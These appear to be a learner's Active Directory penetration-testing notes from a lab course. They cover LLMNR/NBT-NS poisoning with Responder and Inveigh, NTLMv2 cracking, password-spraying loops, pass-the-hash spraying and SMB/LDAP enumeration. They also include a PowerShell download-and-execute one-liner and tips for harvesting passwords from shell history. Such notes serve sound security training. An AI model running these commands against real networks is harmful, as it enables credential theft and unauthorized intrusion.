-------------------

### Initial Enumeration

-------------------

- Gathering hosts
- Wireshark can be used to gather hosts with the syntax below-:

```bash
sudo wireshark -E enss224 -A
```
- Tcpdump-:
```bash
sudo tcpdump -i ens224 
```

- Gather host with `fping`,Fping provides us with a similar capability as the standard ping application in that it utilizes ICMP requests and replies to reach out and interact with a host. 

```bash
fping -asgq 172.16.5.0/23
```

### LLMNR/NBT-NS Poisoning

----------------

- After internal enumeration of the hosts and services, In this phase, we will work through two different techniques side-by-side: network poisoning and password spraying. We will perform these actions with the goal of acquiring valid cleartext credentials for a domain user account, thereby granting us a foothold in the domain to begin the next phase of enumeration from a credentialed standpoint.
- LLMNR-: port 5355
- NBT-NS: 137
- A Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. Though not covered in this module, these hashes can also sometimes be used to perform an SMB Relay attack to authenticate to a host or multiple hosts in the domain with administrative privileges without having to crack the password hash offline. Let's dive in!Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails
- LLMNR/NBT-NS can be used for name resolution and this is where responder comes in.We can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host.his poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host.
- Quick Explanation-:
  - A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
  - The DNS server responds, stating that this host is unknown.
  - The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
  - The attacker (us with Responder running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
  - The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.

- Responder-:
```bash
sudo responder -I ens224 
```

- Cracking NTLMv2 hash with hashcat-:

```bash
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```
- Use John the Ripper-:

```bash
john --wordlist=[] hash.txt
```

### Exploitng LLMNR/NBT-NS attacks with Inveigh.exe on windows

-------------

- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)-: If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth.
- Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.Don't forget to run as adminstrator `powershell start powershell -v runAs`.Using Inveigh-:

```powershell
Invoke-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
![image](https://github.com/user-attachments/assets/56b17304-f7db-49e0-93a7-ba3c29d4996e)
- Captured Hashes-:

- C# Inveigh Zero-:
- Usage-:
```powershell
.\Inveigh.exe
```
- We can hit the esc key to enter the console while Inveigh is running.

![image](https://github.com/user-attachments/assets/5274c331-3afc-4f79-a58a-26e952918efa)

- Hit "help" for several options-:

![image](https://github.com/user-attachments/assets/c119c284-9260-4473-a2a7-ee28272352a8)

- We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.

### Using ldap-search

----------------

- To filter objects, use -W "objectClass="

```bash
ldapsearch -x -H ldap://[ip] -b 'dc=support,dc=htb' -D "support\ldap" -W 'objectClass=user'
```

- All objects, use -W "objectClass=*"

![image](https://github.com/user-attachments/assets/4ad995ae-a820-4520-a17d-8c5c68fe8abe)

- Users in the directory -: `objectClass=user`

```bash
ldapsearch -x -H ldap://[ip] -b 'dc=support,dc=htb' -D "support\ldap" -W 'objectClass=user'
```

- Using ldapsearch with password stored in a file.I used `-n` to prevent newline in text file.Use `-y` to specify passwd file.

```bash
ldapsearch -x -H ldap://support.htb -b 'dc=support,dc=htb' -D "support\ldap" -W 'objectClass=user' -y passwd
```

```
echo -n "password" > passwd
chmod 600 passwd
```

![image](https://github.com/user-attachments/assets/966f7ace-f31a-49d7-bbdc-b9f715219953)

- Finding the user without -W "filter" -:

```bash
ldapsearch -x -H ldap://support.htb -b 'cn=support,cn=users,dc=support,dc=htb' -D "support\ldap" '(objectClass=user)' -y passwd
```
![image](https://github.com/user-attachments/assets/9472fa1e-9422-4dde-b5fe-ba2d4e2d46f0)

- Groups-:

```bash
ldapsearch -x -H ldap://support.htb -b 'dc=support,dc=htb' -D "support\ldap" '(objectClass=group)'
```

- Computer Accounts-:

```bash
ldapsearch -x -H ldap://support.htb -b 'dc=support,dc=htb' -D "support\ldap" '(objectClass=computer)' -y passwd
```

- Users of a group-:

```bash
ldapsearch -x -H ldap://support.htb -b 'dc=support,dc=htb' -D "support\ldap" '(sAMAccountName=*)' -y passwd
```

### Password Spraying overview

---------------

- Enumerating and retrieving password policies
 - With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec, rpcclient or nxc.
   ```bash
   nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
   ```
   <img width="1908" height="500" alt="image" src="https://github.com/user-attachments/assets/e970ee24-cf00-4975-8915-f90bbe6512ac" />

- You can also use smb null sessions.The first is via an SMB NULL session. SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.
- Using `rpcclient`-:

```bash
rpcclient -U "" -N 172.16.5.5
```

- Query for passwordinfo with `querydominfo` and `getdompwinfo`.

<img width="629" height="427" alt="image" src="https://github.com/user-attachments/assets/2ec677b6-02a3-4daa-af12-fa290f5e9fac" />

- Use `Enum4linux-ng`

```bash
enum4linux -P 172.16.5.5
```

<img width="1068" height="898" alt="image" src="https://github.com/user-attachments/assets/d39bc36f-cc5a-4b56-8959-4b44980756f4" />

- Or use `enum4linux-ng` to retrieve the output in a file format

```bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```
- Enumerating the Password Policy - from Linux - LDAP Anonymous Bind
 - LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests. We still see this configuration from time to time as an admin may have needed to set up a particular application to allow anonymous binds and given out more than the intended amount of access, thereby giving unauthenticated users access to all objects in AD.
   ```bash
   ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
   ```

<img width="1242" height="284" alt="image" src="https://github.com/user-attachments/assets/188505c9-5980-4c56-b270-76854ecb4395" />


--------------

### Windows 

--------------

- Using net for null sessions

```cmd
 net use \\host\ipc$ "" /u:"" 
```

- Use

```cmd
net accounts
```

- Powerview script

```powershell
import-module .\PowerView.ps1
Get-DomainPolicy
```

---------------

### Making a user list for password spraying

---------------

- Using enum4linux

```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

<img width="1003" height="564" alt="image" src="https://github.com/user-attachments/assets/3284864b-5378-47e7-87c1-674902874bda" />

- Using rpcclient's `enumdomusers`

```bash
rpcclient -U "" -N 172.16.5.5
```

<img width="695" height="594" alt="image" src="https://github.com/user-attachments/assets/d559c55d-df34-4cf9-a191-fcd4324147af" />

- Using `nxc`'s `--users` flag

```bash
nxc smb[host] --users
```

<img width="1902" height="739" alt="image" src="https://github.com/user-attachments/assets/b7316540-d2c7-424c-b398-9ba6ab882823" />

- Or use `ldapsearch`,it should also be noted that the use of `-h` is deprecated while `-H` is the new switch.

```bash
ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

<img width="1618" height="486" alt="image" src="https://github.com/user-attachments/assets/201183f5-da5e-4b99-965e-e2e805bcca7d" />

- Or `winldapsearch`-:
```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
- Or use `kerbrute`

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

- Lastly, you can enumerate users with credentials.Use nxc

```bash
nxc smb 172.16.5.5 -u htb-student -p "Academy_student_AD\!" --users
```

<img width="1913" height="589" alt="image" src="https://github.com/user-attachments/assets/cd4c36b7-462f-4ecd-a6fa-0d8fa2ef7e2e" />



---------------

### Password Spraying

----------------

-   Rpcclient is an excellent option for performing this attack from Linux. An important consideration is that a valid login is not immediately apparent with rpcclient, with the response Authority Name indicating a successful login. We can filter out invalid login attempts by grepping for Authority in the response. The following Bash one-liner (adapted from here) can be used to perform the attack.

```bash
for u in $(cat valid_ad_users);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

<img width="1420" height="684" alt="image" src="https://github.com/user-attachments/assets/c3a56b02-aeb7-4936-aecd-cb7e7320c4dd" />

- Kerbrute too-:

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

<img width="1064" height="389" alt="image" src="https://github.com/user-attachments/assets/23b483a6-1fc3-429d-88f8-fcd774498b42" />

- Using nxc-:

```bash
nxc smb 172.16.5.5 -u [file_name] -p Password123 | grep +
```

- Validating with nxc-:

```bash
nxc smb 172.16.5.5 -u avazquez -p Password123
```

<img width="1897" height="571" alt="image" src="https://github.com/user-attachments/assets/2dbdef7c-593b-431f-bafb-cf45f1a2db9d" />

- When working with local administrator accounts, one consideration is password re-use or common password formats across accounts. If we find a desktop host with the local administrator account password set to something unique such as $desktop%@admin123, it might be worth attempting $server%@admin123 against servers. Also, if we find non-standard local administrator accounts such as bsmith, we may find that the password is reused for a similarly named domain user account. The same principle may apply to domain accounts. If we retrieve the password for a user named ajones, it is worth trying the same password on their admin account (if the user has one), for example, ajones_adm, to see if they are reusing their passwords. This is also common in domain trust situations. We may obtain valid credentials for a user in domain A that are valid for a user with the same or similar username in domain B or vice-versa.
- Password spraying hash gotten from a SAM database with `nxc`. The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain.

```bash
nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

### With Windows

-----------------

-

-----------------

### Enumerating Security Controls

-----------------

- After gaining access, it is important to understand the defensive state of the host, enumerate further with tools or `living off the land` with tools that exist solely on the host.
- Windows Defender, use-: If real-time protection is set, it is  active

```powershell
Get-MpComputerStatus
```

- Applocker-: An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the PowerShell.exe executable, but forget about the other PowerShell executable locations such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. We can see that this is the case in the AppLocker rules shown below.
- Getting the rules-:

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

- Powershell Constrained Language Mode-: It restricts the syntax to be used on powershell

```powershell
$ExecutionContext.SessionState.LanguageMode
```

- LAPS(MIcrosoft Local Administrator Password Solution)-: It is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed.  The LAPSToolkit greatly facilitates this with several functions. One is parsing ExtendedRights for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives All Extended Rights over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.
- Using `Find-LAPSDelegatedGroups`-:(This can help us target specific AD users who can read LAPS passwords.)
- The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
- We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

-----------------

### Credentialed Enumeration (from Linux)

-----------------

- Using `nxc`(crackmapxec upgraded version)-:
- Domain User Enumeration-:

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

<img width="1876" height="454" alt="image" src="https://github.com/user-attachments/assets/3ec37e6e-36c2-435b-845c-5a20ba425bf6" />

- Domain group enumeration(use crackmapexec)-:

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
<img width="1905" height="707" alt="image" src="https://github.com/user-attachments/assets/24eca022-436d-40da-b9cc-230863387582" />

- Logged-on-users too-:

```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
```
- Share enumeration-:

```bash
sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
```
<img width="1887" height="314" alt="image" src="https://github.com/user-attachments/assets/713e0cd4-37cb-421c-a751-2e0c253c9a1e" />

- Grab all shares-:

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus
```

<img width="1908" height="622" alt="image" src="https://github.com/user-attachments/assets/937876fd-0f3d-472d-a48d-6d45a887df09" />

- Grab a single share-:

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share "zzzz"
```
- Using smbmap-:
- Checking access-:

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

<img width="1225" height="573" alt="image" src="https://github.com/user-attachments/assets/6bdab111-9849-4a8e-97b8-004f179a28cf" />

- Recursively listing all directories-:

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

<img width="1506" height="832" alt="image" src="https://github.com/user-attachments/assets/686375b3-e571-4ae4-a8dd-775b8ca9efdf" />

- RPCCLIENT-:rpcclient is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD. It is highly versatile; we just have to find the correct command to issue for what we want to accomplish. The man page for rpcclient is very helpful for this; just type man rpcclient into your attack host's shell and review the options available. Let's cover a few rpcclient functions that can be helpful during a penetration test.

- Samba null session-:

```bash
rpcclient -U "" -N 172.16.5.5
```
<img width="419" height="113" alt="image" src="https://github.com/user-attachments/assets/66422a38-d3f1-4ac1-84e1-d44933a46691" />

-  What is an `RID`? A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects.Examples to full understand-:
  -   E.g the sid for domain `INLANEFREIGHT.local` is `S-1-5-21-3842939050-3880317879-2865463114`
  -   If an object is created on a domain the rid is merged with the sid to create a unique value of theobject
  -   So the domain user htb-student with a RID:[0x457] Hex 0x457 would = decimal 1111, will have a full user SID of: S-1-5-21-3842939050-3880317879-2865463114-1111.
- However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals 500. The built-in Administrator account will always have the RID value Hex 0x1f4, or 500. This will always be the case. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the htb-student user.
- User enumeration by RID-:

```
queryuser 0x457
```

- [Active Directory powershell module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
- Investigating modules, search with

```powershell
Get-Module
```

<img width="745" height="274" alt="image" src="https://github.com/user-attachments/assets/52a523b7-7997-4338-bc19-ea682585784b" />

-  The Get-Module cmdlet, which is part of the Microsoft.PowerShell.Core module, will list all available modules, their version, and potential commands for use. This is a great way to see if anything like Git or custom administrator scripts are installed. If the module is not loaded, run Import-Module ActiveDirectory to load it for use.

```powershell
Import-Module ActiveDirectory
```

### Snaffler

----------------

- Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.
- [Snaffler](https://github.com/SnaffCon/Snaffler/releases)
- Using it-:

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

 - `wmic qfe get Caption,Description,HotFixID,InstalledOn`:`prints the patches to the host`:`prints out patches to the host`
 - `ipconfig /all`:`Network information`
 - `set`: `environmental variables`
 -  `echo %USERDOMAIN%`:`prints user domain`
 -  `echo %logonserver%`

-----------------  

- Harnessing powershell-:
  - `Get-Module`:`Show modules`
  - `Get-ExecutionPolicy -List`:`prints the execution process for a host`
  - ` Set-ExecutionPolicy Bypass -Scope Process`:`Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.`
  - `Get-ChildItem Env: | ft key,value`:`Return environment values such as key paths, users, computer information, etc.`
  - `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`:`With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.`
  - `powershell -nop -c "iex(New-Object New-WebClient).DownloadString('url');Some Command"`:`This is a quick and easy way to download a file from the web using PowerShell and call it from memory.`

- Downgrading powershell

### Windows Management Instructions

------------------

- Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.
